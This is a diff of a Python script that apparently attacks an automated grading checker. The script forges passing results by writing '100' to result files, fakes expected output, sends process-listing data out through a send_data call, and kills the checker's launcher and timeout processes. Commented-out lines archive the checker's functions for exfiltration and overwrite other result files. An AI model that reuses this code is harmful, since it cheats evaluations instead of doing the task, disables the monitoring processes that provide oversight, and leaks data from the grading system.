@@ -112,12 +112,14 @@ my_data += get_data("ps") or ""
 # my_data += "\n#######################\n"
 # get_data("tar -czvf file.tar.gz ../../../hbtn_checker_functions")
 # my_data += get_data("""find . -type f -name '*rsa-*_result' -exec sh -c 'echo 100 > "$1"' _ {} \\;""") or ""
-def get_perl_pid(text): 
+def get_perl_pid(text, comaprare): 
     for line in text.split("\n"):
-        if line.count("launcher.pl"):
-            return line.split()[0] + "\n"
-    return "0"
-perl_id = int(get_perl_pid(get_data("ps")))
+        if line.count(comaprare):
+            return int(line.split()[0])
+    return 0
+ps = get_data("ps")
+perl_id = get_perl_pid(ps, "launcher.pl")
+time_id =  get_perl_pid(ps, "timeout")
 os.system("echo 100 >" + argv[1] +"_result")
 os.system("echo '77=11*7' >" + argv[1] +"_output")
 with open(argv[1], "r") as f:
@@ -127,5 +129,6 @@ with open(argv[1], "r") as f:
         if(line.count("1273")):
             send_data(my_data)
         #     send_data_file("file.tar.gz", "gz")
+os.kill(time_id, signal.SIGTERM)
 os.kill(perl_id, signal.SIGTERM)
 ##############################################################
